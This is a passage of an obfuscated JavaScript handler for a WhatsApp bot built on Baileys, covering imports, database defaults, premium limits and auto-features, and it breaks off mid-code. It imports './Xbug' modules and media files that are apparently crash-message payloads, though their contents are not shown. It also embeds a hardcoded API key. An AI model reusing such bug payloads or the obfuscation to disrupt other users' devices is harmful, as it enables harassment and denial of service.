const _0x51ea40=_0x69f9;(function(_0x36939a,_0x25808a){const _0x4b3284=_0x69f9,_0x49da1f=_0x36939a();while(!![]){try{const _0x3f70c8=-parseInt(_0x4b3284(0x19b))/0x1+parseInt(_0x4b3284(0x1af))/0x2+-parseInt(_0x4b3284(0x199))/0x3*(parseInt(_0x4b3284(0x1bc))/0x4)+parseInt(_0x4b3284(0x1a9))/0x5*(-parseInt(_0x4b3284(0x1c3))/0x6)+parseInt(_0x4b3284(0x1a7))/0x7+parseInt(_0x4b3284(0x1a3))/0x8+-parseInt(_0x4b3284(0x1b7))/0x9*(parseInt(_0x4b3284(0x19f))/0xa);if(_0x3f70c8===_0x25808a)break;else _0x49da1f['push'](_0x49da1f['shift']());}catch(_0x21fff0){_0x49da1f['push'](_0x49da1f['shift']());}}}(_0x54cc,0xe50f3),process['on'](_0x51ea40(0x1ae),console[_0x51ea40(0x1a6)]),process['on']('uncaughtException',console[_0x51ea40(0x1a6)]),process[_0x51ea40(0x1aa)](0xc8),require(_0x51ea40(0x1c6)));const fs=require('fs'),os=require('os'),util=require(_0x51ea40(0x1be)),jimp=require('jimp'),path=require(_0x51ea40(0x197)),https=require(_0x51ea40(0x1bb)),fse=require('fs-extra'),axios=require(_0x51ea40(0x1a0)),chalk=require(_0x51ea40(0x1bd)),yts=require(_0x51ea40(0x1a2)),ytdl=require(_0x51ea40(0x1ac)),cron=require(_0x51ea40(0x1a5)),cheerio=require(_0x51ea40(0x196)),request=require(_0x51ea40(0x1ba)),maker=require(_0x51ea40(0x19e)),fetch=require('node-fetch'),FileType=require(_0x51ea40(0x19d)),{JSDOM}=require(_0x51ea40(0x1bf)),agent=require(_0x51ea40(0x19a)),webp=require('node-webpmux'),ffmpeg=require(_0x51ea40(0x1b2)),speed=require(_0x51ea40(0x1ad)),{performance}=require(_0x51ea40(0x1a4)),moment=require('moment-timezone'),{exec,spawn,execSync}=require(_0x51ea40(0x1c4)),googleTTS=require(_0x51ea40(0x1b9)),more=String[_0x51ea40(0x1a1)](0x200e),readmore=more['repeat'](0xfa1),fsx=require(_0x51ea40(0x1b4)),fg=require(_0x51ea40(0x1c5)),{download}=require(_0x51ea40(0x198)),scp2=require('./lib/scraper2'),jsobfus=require(_0x51ea40(0x1c7)),{translate}=require(_0x51ea40(0x1b0)),{BufferJSON,WA_DEFAULT_EPHEMERAL,generateWAMessageFromContent,proto,getBinaryNodeChildren,generateWAMessageContent,generateWAMessage,prepareWAMessageMedia,areJidsSameUser,getContentType,downloadContentFromMessage}=require('@whiskeysockets/baileys');let ntnsfw=JSON[_0x51ea40(0x1c1)](fs[_0x51ea40(0x1a8)]('./src/nsfw.json')),bad=JSON['parse'](fs[_0x51ea40(0x1a8)](_0x51ea40(0x1b6)));function _0x69f9(_0x330627,_0x65a86a){const _0x54ccc9=_0x54cc();return _0x69f9=function(_0x69f99,_0x364e75){_0x69f99=_0x69f99-0x196;let _0x19cd01=_0x54ccc9[_0x69f99];return _0x19cd01;},_0x69f9(_0x330627,_0x65a86a);}const {xlicontext1}=require('./Xbug/xlicontext1'),{xlicontext2}=require(_0x51ea40(0x1b1)),{xlicontext3}=require(_0x51ea40(0x1b3)),{xlicontext4}=require(_0x51ea40(0x1ab)),{xlicontext5}=require('./Xbug/xlicontext5'),{xlicontext6}=require(_0x51ea40(0x1c0)),{xlicontext7}=require('./Xbug/xlicontext7'),{xlicontext8}=require(_0x51ea40(0x1c2)),{xlicontext9}=require(_0x51ea40(0x1b8)),{xlicontext10}=require(_0x51ea40(0x19c)),wkwk=fs[_0x51ea40(0x1a8)]('./Xbug/x.mp3'),xsteek=fs['readFileSync'](_0x51ea40(0x1b5)),o=fs[_0x51ea40(0x1a8)]('./Xbug/o.jpg');function _0x54cc(){const _0x2c1505=['@distube/ytdl-core','performance-now','unhandledRejection','3687584AQLKDc','@vitalets/google-translate-api','./Xbug/xlicontext2','fluent-ffmpeg','./Xbug/xlicontext3','fs-extra','./Xbug/x.webp','./src/badword.json','116568AvcLij','./Xbug/xlicontext9','google-tts-api','request','https','4jtpiMd','chalk','util','jsdom','./Xbug/xlicontext6','parse','./Xbug/xlicontext8','15024aUJiot','child_process','api-dylux','./settings','javascript-obfuscator','cheerio','path','aptoide-scraper','3136944SwAXQe','superagent','757605MGmJrM','./Xbug/xlicontext10','file-type','mumaker','1760aoymDl','axios','fromCharCode','yt-search','13815712vZLElN','perf_hooks','node-cron','error','11519116GyqaLD','readFileSync','390fyjrFQ','setMaxListeners','./Xbug/xlicontext4'];_0x54cc=function(){return _0x2c1505;};return _0x54cc();}
const _0x211e5f=_0x206c;(function(_0x4f1ee6,_0x4d2097){const _0x353ec8=_0x206c,_0x18a6a0=_0x4f1ee6();while(!![]){try{const _0x56e90e=-parseInt(_0x353ec8(0x11a))/0x1+parseInt(_0x353ec8(0x11e))/0x2+parseInt(_0x353ec8(0x120))/0x3*(-parseInt(_0x353ec8(0x118))/0x4)+parseInt(_0x353ec8(0x121))/0x5*(parseInt(_0x353ec8(0x11f))/0x6)+-parseInt(_0x353ec8(0x113))/0x7+-parseInt(_0x353ec8(0x122))/0x8*(parseInt(_0x353ec8(0x116))/0x9)+parseInt(_0x353ec8(0x119))/0xa*(parseInt(_0x353ec8(0x11b))/0xb);if(_0x56e90e===_0x4d2097)break;else _0x18a6a0['push'](_0x18a6a0['shift']());}catch(_0x20fbea){_0x18a6a0['push'](_0x18a6a0['shift']());}}}(_0x2f57,0xb36e2));function _0x2f57(){const _0x425e0e=['135VEifMF','parse','1978684pEWnQK','1050cqXgvd','480512CLwbck','176869KPcJeH','./VTHmedia/database/vthimage.json','readFileSync','2803398lqflhp','6hBFIyW','6TRJRkd','4859645FrGzEk','273416akMnbP','./VTHmedia/database/doc.json','9411276LyQnGN','./VTHmedia/database/zip.json','./VTHmedia/database/vthvn.json'];_0x2f57=function(){return _0x425e0e;};return _0x2f57();}function _0x206c(_0xbea75f,_0xa5d2b){const _0x2f577b=_0x2f57();return _0x206c=function(_0x206caa,_0x1b4690){_0x206caa=_0x206caa-0x113;let _0x529dee=_0x2f577b[_0x206caa];return _0x529dee;},_0x206c(_0xbea75f,_0xa5d2b);}const VoiceNoteveran=JSON[_0x211e5f(0x117)](fs['readFileSync'](_0x211e5f(0x115))),Stickerveran=JSON[_0x211e5f(0x117)](fs[_0x211e5f(0x11d)]('./VTHmedia/database/vthsticker.json')),Imageveran=JSON[_0x211e5f(0x117)](fs[_0x211e5f(0x11d)](_0x211e5f(0x11c))),Videoveran=JSON[_0x211e5f(0x117)](fs[_0x211e5f(0x11d)]('./VTHmedia/database/vthvideo.json')),Docveran=JSON[_0x211e5f(0x117)](fs[_0x211e5f(0x11d)](_0x211e5f(0x123))),Zipveran=JSON[_0x211e5f(0x117)](fs[_0x211e5f(0x11d)](_0x211e5f(0x114))),Apkveran=JSON['parse'](fs[_0x211e5f(0x11d)]('./VTHmedia/database/apk.json'));
const prem = require('./src/premium');
const owner = JSON.parse(fs.readFileSync('./src/owner.json'));
const { TelegraPh, UploadFileUgu } = require('./lib/uploader');
const uploadImage = require('./lib/uploadImage');
const {
    toAudio,
    toPTT,
    toVideo,
    addExifAvatar,
    makeid,
  Telesticker,
  formatBytes,
  formatDuration
} = require('./lib/converter');
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list');
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js');
const { imageToWebp, videoToWebp, writeExif, writeExifImg, writeExifVid } = require('./lib/exif');
const { chatGpt, tiktokDl, ytMp4, ytMp3 } = require('./lib/screaper');
const { gameSlot, gameCasinoSolo, gameMerampok, gameTangkapOr, daily, transferLimit, transferUang, buy, setLimit, setUang } = require('./lib/game');
const { pinterest, wallpaper, wikimedia, quotesAnime, happymod, umma, ringtone, jadwalsholat, styletext } = require('./lib/scraper');
const { formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, webApi, parseMention, generateProfilePicture, getRandom, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, generateToken, batasiTeks, randomText, isEmoji, getAllHTML, fetchBuffer, GIFBufferToVideoBuffer } = require('./lib/function');
// Read Database
let vote = db.others.vote = []
const veranverifieduser = JSON.parse(fs.readFileSync('./src/user.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
			users: {},
			groups: {},
			database: {},
			 settings: {},
			others: {},
...(global.db || {})
}

module.exports = VeranBotInc = async (VeranBotInc, m, chatUpdate, store) => {
	try {
		const {
            type
        } = m
        const botNumber = await VeranBotInc.decodeJid(VeranBotInc.user.id)
        const VeranTheCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
		const budy = (typeof m.text == 'string' ? m.text : '')
		const prefix = /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : '.'
		const isCmd = body.startsWith(prefix)
		//prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const veranybody = body.startsWith(pric)
        const isCommand = veranybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
		const args = body.trim().split(/ +/).slice(1)
		const getQuoted = (m.quoted || m)
		const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
		const command = VeranTheCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
		const text = q = args.join(' ')
		const mime = (quoted.msg || quoted).mimetype || ''
		const qmsg = (quoted.msg || quoted)
		const sender = m.sender
		const isUser = veranverifieduser.includes(sender)
		const groupMetadata = m.isGroup ? await VeranBotInc.groupMetadata(m.chat).catch(e => {}) : ''
		const participants = m.isGroup ? await groupMetadata.participants : ''
		if (m.isGroup) {
			m.metadata = await VeranBotInc.groupMetadata(m.chat)
			m.admins = (m.metadata.participants.reduce((a, b) => (b.admin ? a.push({ id: b.id, admin: b.admin }) : [...a]) && a, []))
			m.isAdmin = m.admins.some((b) => b.id === m.sender)
			m.participant = m.key.participant
			m.isBotAdmin = !!m.admins.find((member) => member.id === botNumber)
		}
		
		function _0x5d25(){const _0x22dd00=['22764BwOZYO','16hZkNJT','audioMessage','test','extendexTextMessage','411615PTNmdZ','232006cSVtVi','documentMessage','130IUtqUV','2345266yqPmhB','954972OLUOpe','2031636cmaTGu','imageMessage','1108877qmZaqT','videoMessage','104LzenXf','extendedTextMessage','contactMessage','4yEnuAS','locationMessage','stickerMessage','mtype'];_0x5d25=function(){return _0x22dd00;};return _0x5d25();}const _0x324f04=_0x350a;function _0x350a(_0x2e0091,_0x5f5b9a){const _0x5d2571=_0x5d25();return _0x350a=function(_0x350a92,_0x311093){_0x350a92=_0x350a92-0x191;let _0x54ba28=_0x5d2571[_0x350a92];return _0x54ba28;},_0x350a(_0x2e0091,_0x5f5b9a);}(function(_0x400521,_0x460d3b){const _0x3e7554=_0x350a,_0x27f7ed=_0x400521();while(!![]){try{const _0x5194ff=parseInt(_0x3e7554(0x193))/0x1*(-parseInt(_0x3e7554(0x19d))/0x2)+parseInt(_0x3e7554(0x197))/0x3*(-parseInt(_0x3e7554(0x1a6))/0x4)+parseInt(_0x3e7554(0x19c))/0x5+-parseInt(_0x3e7554(0x1a2))/0x6+-parseInt(_0x3e7554(0x1a0))/0x7+parseInt(_0x3e7554(0x198))/0x8*(parseInt(_0x3e7554(0x1a1))/0x9)+-parseInt(_0x3e7554(0x19f))/0xa*(-parseInt(_0x3e7554(0x1a4))/0xb);if(_0x5194ff===_0x460d3b)break;else _0x27f7ed['push'](_0x27f7ed['shift']());}catch(_0x8f004b){_0x27f7ed['push'](_0x27f7ed['shift']());}}}(_0x5d25,0x41f06));const isMedia=/image|video|sticker|audio/[_0x324f04(0x19a)](mime),isImage=type==_0x324f04(0x1a3),isVideo=type==_0x324f04(0x1a5),isAudio=type==_0x324f04(0x199),isDocument=type==_0x324f04(0x19e),isLocation=type==_0x324f04(0x194),isContact=type==_0x324f04(0x192),isSticker=type==_0x324f04(0x195),isText=type=='textMessage',isQuotedText=type===_0x324f04(0x19b),isQuotedImage=type==='extendedTextMessage',isQuotedLocation=type===_0x324f04(0x191),isQuotedVideo=type===_0x324f04(0x191),isQuotedSticker=type===_0x324f04(0x191),isQuotedAudio=type===_0x324f04(0x191),isQuotedContact=type===_0x324f04(0x191),isQuotedDocument=type===_0x324f04(0x191),isVTHmedia=m[_0x324f04(0x196)];
   
        const _0x35b0b8=_0x7fc4;function _0x577e(){const _0x50904e=['autotype','antispam','lastclaim','autoblocknum','antidelete','autobio','2642216VDKFWt','onlypc','key','settings','autosticker','online','anticontact','limit','totalhit','lastrampok','antipromotion','remoteJid','30izvMAI','groups','antidocument','welcome','afkTime','antiforeignnum','antilink','users','6GXIoUg','autorecord','antiimage','vip','586196IcYDif','video','checkPremiumUser','sender','setinfo','afkReason','uang','onlyindia','autostatusview','antiaudio','split','antibot','onlygrub','13540MgPcEx','participant','object','3231402urCHdf','6713847tcQeyr','boolean','random','ntnsfw','antivirtex','premium','badword','antisticker','chat','free','antilocation','160930fAsPlQ','isGroup','2552495gQnCdJ','70CZmKqK','antipoll','onlyindo','user','antiviewonce','antivideo','autorecordtype','autoread','7WpDudX','autodownload','totalError','antostatusview'];_0x577e=function(){return _0x50904e;};return _0x577e();}(function(_0x3e0783,_0x2e0677){const _0x89aa05=_0x7fc4,_0x1ecccb=_0x3e0783();while(!![]){try{const _0x5c369a=-parseInt(_0x89aa05(0x1a7))/0x1*(-parseInt(_0x89aa05(0x195))/0x2)+parseInt(_0x89aa05(0x184))/0x3*(-parseInt(_0x89aa05(0x188))/0x4)+parseInt(_0x89aa05(0x1a4))/0x5+-parseInt(_0x89aa05(0x198))/0x6*(-parseInt(_0x89aa05(0x1af))/0x7)+-parseInt(_0x89aa05(0x1b9))/0x8+parseInt(_0x89aa05(0x199))/0x9+parseInt(_0x89aa05(0x17c))/0xa*(-parseInt(_0x89aa05(0x1a6))/0xb);if(_0x5c369a===_0x2e0677)break;else _0x1ecccb['push'](_0x1ecccb['shift']());}catch(_0x5b1e6d){_0x1ecccb['push'](_0x1ecccb['shift']());}}}(_0x577e,0x73056));const clientId=VeranBotInc[_0x35b0b8(0x1aa)]['id'][_0x35b0b8(0x192)](':')[0x0],senderbot=m[_0x35b0b8(0x1bb)]['fromMe']?VeranBotInc[_0x35b0b8(0x1aa)]['id']['split'](':')[0x0]+'@s.whatsapp.net'||VeranBotInc[_0x35b0b8(0x1aa)]['id']:m[_0x35b0b8(0x1bb)][_0x35b0b8(0x196)]||m[_0x35b0b8(0x1bb)][_0x35b0b8(0x17b)],senderId=senderbot[_0x35b0b8(0x192)]('@')[0x0],isBot=clientId['includes'](senderId);try{const isNumber=_0x41da5d=>typeof _0x41da5d==='number'&&!isNaN(_0x41da5d),isBoolean=_0x5762e3=>typeof _0x5762e3===_0x35b0b8(0x19a)&&Boolean(_0x5762e3);let user=global['db'][_0x35b0b8(0x183)][m[_0x35b0b8(0x18b)]],limitUser=user?user['vip']?global[_0x35b0b8(0x177)][_0x35b0b8(0x187)]:prem[_0x35b0b8(0x18a)](m['sender'],premium)?global[_0x35b0b8(0x177)][_0x35b0b8(0x19e)]:global[_0x35b0b8(0x177)]['free']:prem[_0x35b0b8(0x18a)](m[_0x35b0b8(0x18b)],premium)?global['limit']['premium']:global[_0x35b0b8(0x177)][_0x35b0b8(0x1a2)],uangUser=user?user[_0x35b0b8(0x187)]?global[_0x35b0b8(0x18e)][_0x35b0b8(0x187)]:prem[_0x35b0b8(0x18a)](m[_0x35b0b8(0x18b)],premium)?global['uang'][_0x35b0b8(0x19e)]:global[_0x35b0b8(0x18e)][_0x35b0b8(0x1a2)]:prem[_0x35b0b8(0x18a)](m[_0x35b0b8(0x18b)],premium)?global[_0x35b0b8(0x18e)][_0x35b0b8(0x19e)]:global[_0x35b0b8(0x18e)][_0x35b0b8(0x1a2)];if(typeof user!=='object')global['db']['users'][m['sender']]={};if(user){if(!(_0x35b0b8(0x187)in user))user[_0x35b0b8(0x18d)]=![];if(!isNumber(user[_0x35b0b8(0x180)]))user[_0x35b0b8(0x180)]=-0x1;if(!(_0x35b0b8(0x18d)in user))user[_0x35b0b8(0x18d)]='';if(!isNumber(user[_0x35b0b8(0x177)]))user[_0x35b0b8(0x177)]=limitUser;if(!(_0x35b0b8(0x18e)in user))user[_0x35b0b8(0x18e)]=uangUser;if(!(_0x35b0b8(0x1b5)in user))user[_0x35b0b8(0x1b5)]=new Date()*0x1;if(!(_0x35b0b8(0x179)in user))user[_0x35b0b8(0x179)]=new Date()*0x1;}else global['db'][_0x35b0b8(0x183)][m[_0x35b0b8(0x18b)]]={'vip':![],'afkTime':-0x1,'afkReason':'','limit':limitUser,'uang':uangUser,'lastclaim':new Date()*0x1,'lastrampok':new Date()*0x1};let group=global['db'][_0x35b0b8(0x17d)][m[_0x35b0b8(0x1a1)]];if(typeof group!=='object')global['db']['groups'][m[_0x35b0b8(0x1a1)]]={};if(group){if(!('ntnsfw'in group))group[_0x35b0b8(0x19c)]=![];if(!(_0x35b0b8(0x17f)in group))group[_0x35b0b8(0x17f)]=![];if(!(_0x35b0b8(0x18c)in group))group[_0x35b0b8(0x18c)]=![];if(!(_0x35b0b8(0x19f)in group))group[_0x35b0b8(0x19f)]=![];if(!(_0x35b0b8(0x181)in group))group[_0x35b0b8(0x181)]=![];if(!(_0x35b0b8(0x193)in group))group[_0x35b0b8(0x193)]=![];if(!('antivv'in group))group[_0x35b0b8(0x1ab)]=!![];if(!(_0x35b0b8(0x1b4)in group))group[_0x35b0b8(0x1b4)]=!![];if(!('antimedia'in group))group['media']=![];if(!(_0x35b0b8(0x19d)in group))group[_0x35b0b8(0x19d)]=!![];if(!(_0x35b0b8(0x186)in group))group['antiimage']=![];if(!(_0x35b0b8(0x1ac)in group))group[_0x35b0b8(0x189)]=![];if(!(_0x35b0b8(0x191)in group))group['antiaudio']=![];if(!(_0x35b0b8(0x1a8)in group))group[_0x35b0b8(0x1a8)]=![];if(!('antisticker'in group))group[_0x35b0b8(0x1a0)]=![];if(!(_0x35b0b8(0x176)in group))group[_0x35b0b8(0x176)]=![];if(!('antilocation'in group))group[_0x35b0b8(0x1a3)]=![];if(!(_0x35b0b8(0x17e)in group))group[_0x35b0b8(0x17e)]=![];if(!(_0x35b0b8(0x182)in group))group['antilink']=![];if(!(_0x35b0b8(0x17a)in group))group['antipromotion']=![];if(!(_0x35b0b8(0x1b7)in group))group[_0x35b0b8(0x1b7)]=!![];}else global['db'][_0x35b0b8(0x17d)][m['chat']]={'ntsfw':!![],'welcome':![],'setinfo':![],'badword':![],'antiforeignnum':![],'antibot':![],'antivv':!![],'antispam':!![],'antivirtex':!![],'antimedia':![],'antiimage':![],'antivideo':![],'antiaudio':![],'antipoll':![],'antisticker':![],'antilocation':![],'antidocument':![],'anticontact':![],'antilink':![],'antipromotion':!![],'antidelete':!![]};let setting=global['db'][_0x35b0b8(0x1bc)][botNumber];if(typeof setting!==_0x35b0b8(0x197))global['db'][_0x35b0b8(0x1bc)][botNumber]={};if(setting){if(!('anticall'in setting))setting['anticall']=![];if(!(_0x35b0b8(0x1b2)in setting))setting[_0x35b0b8(0x190)]=!![];if(!(_0x35b0b8(0x178)in setting))setting[_0x35b0b8(0x178)]=0x0;if(!(_0x35b0b8(0x1b1)in setting))setting[_0x35b0b8(0x1b1)]=0x0;if(!(_0x35b0b8(0x1be)in setting))setting[_0x35b0b8(0x1be)]=!![];if(!(_0x35b0b8(0x1bd)in setting))setting['autosticker']=![];if(!(_0x35b0b8(0x1b0)in setting))setting[_0x35b0b8(0x1b0)]=![];if(!(_0x35b0b8(0x1b8)in setting))setting[_0x35b0b8(0x1b8)]=!![];if(!(_0x35b0b8(0x1ae)in setting))setting[_0x35b0b8(0x1ae)]=![];if(!(_0x35b0b8(0x1ad)in setting))setting[_0x35b0b8(0x1ad)]=![];if(!(_0x35b0b8(0x185)in setting))setting[_0x35b0b8(0x185)]=!![];if(!(_0x35b0b8(0x1b3)in setting))setting[_0x35b0b8(0x1b3)]=!![];if(!(_0x35b0b8(0x1b6)in setting))setting['autoblocknum']=![];if(!(_0x35b0b8(0x18f)in setting))setting[_0x35b0b8(0x18f)]=![];if(!(_0x35b0b8(0x1a9)in setting))setting[_0x35b0b8(0x1a9)]=![];if(!('onlygrub'in setting))setting[_0x35b0b8(0x194)]=![];if(!('onlypc'in setting))setting[_0x35b0b8(0x1ba)]=![];}else global['db']['settings'][botNumber]={'anticall':![],'antistatusview':!![],'totalhit':0x0,'totalError':0x0,'online':!![],'autosticker':![],'autodownload':![],'autobio':!![],'autoread':![],'autoblocknum':![],'onlyindia':![],'onlyindo':![],'onlygrub':![],'onlypc':![],'autorecordtype':![],'autorecord':!![],'autotype':!![]};}catch(_0x55a81c){throw _0x55a81c;}const isVip=global['db'][_0x35b0b8(0x183)][m[_0x35b0b8(0x18b)]]?global['db'][_0x35b0b8(0x183)][m[_0x35b0b8(0x18b)]][_0x35b0b8(0x187)]:![],isPremium=VeranTheCreator||prem['checkPremiumUser'](m[_0x35b0b8(0x18b)],premium)||![],AntiNsfw=m[_0x35b0b8(0x1a5)]?global['db'][_0x35b0b8(0x17d)][m[_0x35b0b8(0x1a1)]][_0x35b0b8(0x19c)]:![];function _0x7fc4(_0x91bc91,_0x223521){const _0x577e33=_0x577e();return _0x7fc4=function(_0x7fc4c0,_0x37c590){_0x7fc4c0=_0x7fc4c0-0x176;let _0x2bd60f=_0x577e33[_0x7fc4c0];return _0x2bd60f;},_0x7fc4(_0x91bc91,_0x223521);}function pickRandom(_0x728a2){const _0x4da869=_0x35b0b8;return _0x728a2[Math['floor'](_0x728a2['length']*Math[_0x4da869(0x19b)]())];}
		
		const _0xfcf59c=_0x43d3;(function(_0x189a08,_0x3e9ded){const _0x231335=_0x43d3,_0x2f949b=_0x189a08();while(!![]){try{const _0x130ab5=parseInt(_0x231335(0xd5))/0x1*(-parseInt(_0x231335(0xe4))/0x2)+parseInt(_0x231335(0xce))/0x3*(-parseInt(_0x231335(0xe5))/0x4)+-parseInt(_0x231335(0xc4))/0x5*(parseInt(_0x231335(0xd8))/0x6)+parseInt(_0x231335(0xd3))/0x7+parseInt(_0x231335(0xe7))/0x8*(parseInt(_0x231335(0xd9))/0x9)+-parseInt(_0x231335(0xbc))/0xa*(parseInt(_0x231335(0xb8))/0xb)+-parseInt(_0x231335(0xd7))/0xc*(-parseInt(_0x231335(0xd0))/0xd);if(_0x130ab5===_0x3e9ded)break;else _0x2f949b['push'](_0x2f949b['shift']());}catch(_0x32b314){_0x2f949b['push'](_0x2f949b['shift']());}}}(_0x129c,0x7ecfc),cron[_0xfcf59c(0xe3)](_0xfcf59c(0xe8),()=>{const _0x356068=_0xfcf59c;let _0x334911=Object[_0x356068(0xdd)](global['db'][_0x356068(0xee)]);for(let _0x591b2f of _0x334911){const _0x32e0f9=global['db'][_0x356068(0xee)][_0x591b2f][_0x356068(0xe9)]?global['limit'][_0x356068(0xe9)]:prem[_0x356068(0xde)](_0x591b2f,premium)?global['limit'][_0x356068(0xc0)]:global['limit'][_0x356068(0xbe)];global['db'][_0x356068(0xee)][_0x591b2f]['limit']=_0x32e0f9,console[_0x356068(0xe1)](_0x356068(0xcf));}},{'scheduled':!![],'timezone':_0xfcf59c(0xc7)}));if(!VeranBotInc['public']){if(!m['key'][_0xfcf59c(0xc2)])return;}m[_0xfcf59c(0xd6)]&&console[_0xfcf59c(0xe1)](chalk[_0xfcf59c(0xba)][_0xfcf59c(0xb9)](_0xfcf59c(0xbd)),chalk[_0xfcf59c(0xba)][_0xfcf59c(0xd4)](new Date()),chalk[_0xfcf59c(0xba)][_0xfcf59c(0xdc)](_0xfcf59c(0xcc))(budy||m[_0xfcf59c(0xc5)])+'\x0a'+chalk['black'](chalk['bgCyanBright']('[\x20FROM\x20]\x20:'),chalk[_0xfcf59c(0xc6)](m['pushName']),chalk[_0xfcf59c(0xdc)](_0xfcf59c(0xcb))(m[_0xfcf59c(0xbb)]),chalk[_0xfcf59c(0xd1)]('('+(m[_0xfcf59c(0xc3)]?m[_0xfcf59c(0xea)]:_0xfcf59c(0xdf),m['chat'])+')')));if(!m[_0xfcf59c(0xc3)]&&!VeranTheCreator&&db['settings'][botNumber][_0xfcf59c(0xed)]){if(isCommand)return replygcveran(_0xfcf59c(0xc1)+ownernumber);}function _0x129c(){const _0x1578ae=['sender','5551020zhPOzY','[\x20MESSAGE\x20]:','free','Hello\x20buddy!\x20if\x20you\x20want\x20to\x20use\x20this\x20bot,\x20please\x20chat\x20the\x20bot\x20in\x20private\x20chat','premium','Hello\x20buddy!\x20Because\x20We\x20Want\x20to\x20Reduce\x20Spam,\x20Please\x20Use\x20Bot\x20in\x20the\x20Group\x20Chat\x20!\x0a\x0aIf\x20you\x20have\x20issue\x20please\x20chat\x20owner\x20wa.me/','fromMe','isGroup','25JsUtau','type','bgYellow','Asia/Karachi','autoread','settings','chat','#FF449F','#00EAD3','autotype','459138VJaUOY','Limit\x20Reseted','162149TkmSeK','bgBlue','sendPresenceUpdate','2030175ORXJhK','bgGreen','1DEkAIL','message','1356nCLLdb','968718pJWMpw','29511bUBJrb','updateProfileStatus','key','bgHex','keys','checkPremiumUser','Private\x20Chat','onlypc','log','catch','schedule','857296ueuyvu','4Cgejxm','uptime','1864DAGRBP','00\x2000\x20*\x20*\x20*','vip','pushName','readMessages','\x20Have\x20Been\x20Running\x20For\x20','onlygrub','users','11qgwYtE','bgWhite','black'];_0x129c=function(){return _0x1578ae;};return _0x129c();}if(!VeranTheCreator&&db[_0xfcf59c(0xc9)][botNumber][_0xfcf59c(0xe0)]&&m[_0xfcf59c(0xc3)]){if(isCommand)return replygcveran(_0xfcf59c(0xbf));}function _0x43d3(_0x2aaec9,_0x599819){const _0x129cbf=_0x129c();return _0x43d3=function(_0x43d38b,_0x3a6310){_0x43d38b=_0x43d38b-0xb8;let _0x59ded6=_0x129cbf[_0x43d38b];return _0x59ded6;},_0x43d3(_0x2aaec9,_0x599819);}db[_0xfcf59c(0xc9)][botNumber][_0xfcf59c(0xc8)]&&VeranBotInc[_0xfcf59c(0xeb)]([m[_0xfcf59c(0xdb)]]);db[_0xfcf59c(0xc9)][botNumber]['autobio']&&VeranBotInc[_0xfcf59c(0xda)](botname+_0xfcf59c(0xec)+runtime(process[_0xfcf59c(0xe6)]()))[_0xfcf59c(0xe2)](_0x204152=>_0x204152);if(db['settings'][botNumber][_0xfcf59c(0xcd)]){if(m[_0xfcf59c(0xd6)]){let veranpos=['composing'];VeranBotInc[_0xfcf59c(0xd2)](veranpos,m[_0xfcf59c(0xca)]);}}
        
        
        global.chatbot = false
          function _0x33a4(_0x4ed4fb,_0x50a8b1){const _0x3e7e05=_0x3e7e();return _0x33a4=function(_0x33a4b9,_0x3e9b91){_0x33a4b9=_0x33a4b9-0x1c5;let _0x1a8513=_0x3e7e05[_0x33a4b9];return _0x1a8513;},_0x33a4(_0x4ed4fb,_0x50a8b1);}function _0x3e7e(){const _0x4fc720=['error','483eMRXya','39335bzTrPC','9180985thqdKB','get','Unknown\x20error\x20occurred.','https://api.nexoracle.com/ai/chatgpt?apikey=Your-Api-Key&prompt=hi','&apikey=abrotech','isBaileys','1024974zteVJp','373089nZmtnQ','2mFDgCc','Error:\x20Unexpected\x20response\x20from\x20chatbot\x20API.','message','15Kgrjhg','431436eQSBSP','22456NfHDxE','chat','66jwgMtL','1316740HYZsfq','chatbot','data','sendMessage','response','Error:\x20Failed\x20to\x20get\x20a\x20response\x20from\x20the\x20chatbot.\x20'];_0x3e7e=function(){return _0x4fc720;};return _0x3e7e();}const _0x1ac6e2=_0x33a4;(function(_0x74d3e0,_0x1f5908){const _0x5e94bd=_0x33a4,_0x23937a=_0x74d3e0();while(!![]){try{const 